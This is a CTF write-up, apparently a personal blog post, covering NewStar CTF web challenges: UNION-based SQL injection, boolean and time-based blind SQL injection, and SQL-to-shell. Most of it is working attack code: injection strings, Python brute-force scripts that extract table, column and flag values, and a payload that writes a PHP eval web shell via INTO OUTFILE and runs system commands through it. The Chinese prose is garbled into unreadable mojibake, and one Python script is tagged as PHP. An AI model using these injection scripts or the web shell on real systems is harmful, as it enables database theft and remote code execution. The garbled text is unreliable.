---
title: newstar ctf����
date: 2024-12-02 18:48:16
comments: true
description: ѧϰ��¼
categories:
- sqlע�����֪ʶ
- sqlmap����ʹ��
tags:
- sql����
---

# newstar ctf����

## week1����Ƥ������ flag ��������

�����������`1 and 1=1`��`1 and 1=2`�����ֵڶ�������û����ʾ

˵����������ע�룬����ʹ��UNIONע��

�ȿ�����������

`1 ORDER BY 2`��ȷ��ʾ

`1 ORDER BY 3`����

����Ϊ2

�жϻ���λ��

`-1 UNION SELECT 1,2`

����

```
Name: "1"
Position: "2"
```

���Ա�����

```
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --���б�����
-1 union select 1,group_concat(column_name)from information_schema.columns where table_name='Fl4g' --��������
-1 union select 1,group_concat(0x5c,id,0x5c,des,0x5c,value) from Fl4g --����������������
```

���շ���
```
Name: "1"
Position: "\5555\C0ngratu1ati0ns!\flag{NEw5T@r_ctf-Z024e497421ed64}"
```

flag����

## week3-blindsql1

�����������Alice�ܹ����سɼ�

���뵥���Ų�ѯʧ�ܣ������Ա��

```
Alice and 1=1
Alice and 1=2
```

��ʾ�ո񱻽���

��γ��Է���ֻ��äע���������Բ��� and 0 ���� and 1�����Ʒ������������ǲ���äע

����ֱ���������wp�ı��Ʊ�����py�ű�

```python

import requests,string,time

url = 'http://127.0.0.1:9124/'

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + '_-{}':
        time.sleep(0.2) # �������ʣ���ֹ�������

        print('[+] Trying:', c)

        # ��������ܲ�ѯ����ǰ���ݿ����еı���
        tables = f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'

        # ��ȡ���б����ĵ� i ���ַ��������� ascii ֵ
        char = f'(ord(mid({tables},{i},1)))'

        # ���Ƹ� ascii ֵ
        b = f'(({char})in({ord(c)}))'

        # �� ascii �¶��ˣ��� and ����Ľ���� true���᷵�� Alice ������
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

�õ�һ��ѱ��������и�secrets��ֱ�ӳ��Ա�������

```python

import requests,string,time

url = 'http://127.0.0.1:9124/'

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # �������ʣ���ֹ�������

        print('[+] Trying:', c)

        tables = f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'

        char = f'(ord(mid({tables},{i},1)))'

        # ���Ƹ� ascii ֵ
        b = f'(({char})in({ord(c)}))'

        # �� ascii �¶��ˣ��� and ����Ľ���� true���᷵�� Alice ������
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

��������flag������

```python
import requests,string,time

url = 'http://127.0.0.1:9124/'

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # �������ʣ���ֹ�������

        print('[+] Trying:', c)

        tables = f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'

        char = f'(ord(mid({tables},{i},1)))'

        # ���Ƹ� ascii ֵ
        b = f'(({char})in({ord(c)}))'

        # �� ascii �¶��ˣ��� and ����Ľ���� true���᷵�� Alice ������
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

���˰������ڱ����һ��flag

flag{N3wSTar_ctF_Z0Z4171df39d1dc3}

## week4-blindsql2

һ��ʱ��äע��������̽�ˣ�ֱ���Ͻű�sleep��

������(ֱ����wp��)

```python
import requests, string, time

url = 'http://127.0.0.1:2987/'

result = ''
for i in range(1,100):
    print(f'[+]bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # �������ʣ���ֹ�������

        print('[+]trying:', c)

        tables = f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'

        # ��ȡ�� i ���ַ��������� ascii ֵ
        char = f'(ord(mid({tables},{i},1)))'

        # ���Ƹ� ascii ֵ
        b = f'(({char})in({ord(c)}))'

        # �� ascii �¶��ˣ���ִ�� sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url, params={'student_name':p})

        if res.elapsed.total_seconds() > 1.5:
            print('[*]bingo:', c)
            result += c
            print(result)
            break
```

����secrets����

```php
import requests, string, time

url = 'http://ip:port'

result = ''
for i in range(1,100):
    print(f'[+]bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # �������ʣ���ֹ�������

        print('[+]trying:' ,c)

        columns = f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'

        # ��ȡ�� i ���ַ��������� ascii ֵ
        char = f'(ord(mid({columns},{i},1)))'

        # ���Ƹ� ascii ֵ
        b = f'(({char})in({ord(c)}))'

        # �� ascii �¶��ˣ���ִ�� sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url, params={'student_name':p})

        if res.elapsed.total_seconds() > 1.5:
            print('[*]bingo:', c)
            result += c
            print(result)
            break
```

����flag

```python
import requests, string, time

url = 'http://ip:port'

result = ''
for i in range(1,100):
    print(f'[+] bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # �������ʣ���ֹ�������

        print('[+] trying:', c)

        flag = f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'

        # ��ȡ�� i ���ַ��������� ascii ֵ
        char = f'(ord(mid({flag},{i},1)))'

        # ���Ƹ� ascii ֵ
        b = f'(({char})in({ord(c)}))'

        # �� ascii �¶��ˣ���ִ�� sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url, params={'student_name':p})

        if res.elapsed.total_seconds() > 1.5:
            print('[*] bingo:', c)
            result += c
            print(result)
            break
```

�����߼�������äע��û����٣��Ͱѷ��ص��߼��жϸ�Ϊ��Ӧʱ�䳤����ȷ���ַ�����ȷ

## week5-sqlshell

���sqlע��һ�ۿ�����ɵ�ˣ��������ݿ�����ô��

�����Ŀ�漰��һ�仰ľ��(web shell)֪ʶ

��ĿΪsqlshell��˵������Ҫ�����ļ��ϴ�(INTO OUTFILE,����ѯ���д��������ϵ�ָ���ļ�)©��

```python
import requests

url = 'http://192.168.109.128:8889'

payload = '\' || 1 union select 1,2,"<?php eval($_GET[1]);" into outfile \'/var/www/html/3.php\'#'

res = requests.get(url,params={'student_name': payload})
res = requests.get(f'{url}/3.php', params={'1': 'system("cat /you_cannot_read_the_flag_directly");'})
print(res.text)
```

# php�����л�


